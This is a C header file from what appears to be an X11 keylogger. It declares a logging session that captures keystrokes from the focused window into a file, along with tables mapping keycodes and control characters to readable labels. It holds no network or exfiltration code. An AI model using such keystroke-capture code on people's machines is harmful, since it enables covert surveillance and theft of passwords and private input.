#ifndef __DISPLAY_H__
#define __DISPLAY_H__

#include <stdio.h>
#include <X11/Xlib.h>
#include "ikeylog.h"

#define D_KEYCODES_LEN 512
#define D_CONTROLCHARS_LEN 256

/**
 * X11 Logger Session 
 */
typedef struct _X11LogSess {
    Display *dpy;           /** Display where to log */
    Window focuswin;        /** Focused window */
    FILE *fd;               /** Where to dump logged data */
} X11LogSess;


/**
 *  Function declarations
 */
X11LogSess *display_init(void);
int         display_close(X11LogSess *);
void        display_focus(X11LogSess *);
void        display_handle_event(X11LogSess *);



/** 
 * Specify here keycodes you'd like to catch/intercept. 
 * e.g. Whenever ENTER is pressed you want to log "ENTER" (as a string)
 * and not the hex code of ENTER.
 * 
 * If "String representation" is empty then the keycode will be
 * ignored and _NOT_ logged. 
 * 
 * Mapping: keycode -> String representation
 */
typedef struct { KeyCode ks; char *ksname; } KEYCODEMAP;
static const KEYCODEMAP keycodes_table[] = {
    {9,     "[ESCAPE]"},
    {22,    "[BACKSPACE]"},
    {23,    "[TAB]"},
    {36,    "[ENTER]\n"},
    {37,    "[CTRL_L]"},            /* CONTROL L */
    {50,    ""},                    /* SHIFT L */
    {62,    ""},                    /* SHIFT R */
    {64,    ""},                    /* ALT L */
    {67,    "[F1]"},
    {68,    "[F2]"},
    {69,    "[F3]"},
    {70,    "[F4]"},
    {71,    "[F5]"},
    {72,    "[F6]"},
    {73,    "[F7]"},
    {74,    "[F8]"},
    {75,    "[F9]"},
    {76,    "[F10]"},
    {92,    ""},                    /* ALT GR */
    {95,    "[F11]"},
    {96,    "[F12]"},
    {105,   "[CTRL_R]"},            /* CONTROL R */
    {110,   "[HOME]"},
    {111,   "[UP]"},
    {112,   "[PRIOR]"},
    {113,   "[LEFT]"},
    {114,   "[RIGHT]"},
    {115,   "[END]"},
    {116,   "[DOWN]"},
    {117,   "[NEXT]"},
    {118,   "[INSERT]"},
    {119,   "[DELETE]"},
    {133,   "[SUPER L]"},
    {127,   "[PAUSE]"}
};


/**
 * Specify here which control characters you'd like to catch.
 * e.g.: You don't want to log all those carriage return 
 * characters (^M). Then you'll have to ignore ^M by leaving the 
 * "String representation" empty. (see below)
 * 
 * Mapping: Hex code of control char. -> String representation
 * Source: console_codes(4)
 *         http://www.columbia.edu/kermit/ascii.html
 */
typedef struct { int cchar; char *name; } CONTROLCHARMAP;
static const CONTROLCHARMAP controlchars_table[] = {    
    {0x00,  ""},        /* Null */
    {0x01,  "<^A>"},        /* ^A */
    {0x03,  "<^C>"},        /* Ctrl-C */
    {0x07,  "<BEL>"},       /* Bell character */
    {0x08,  ""},            /* BS: BackSpace (^H) */
    {0x0D,  ""},            /* CR: Carriage return (^M) */
    {0x1B,  "<ESC>"},       /* Escape */
    {0x9B,  "<CSI>"}
};


#endif /* display.h */
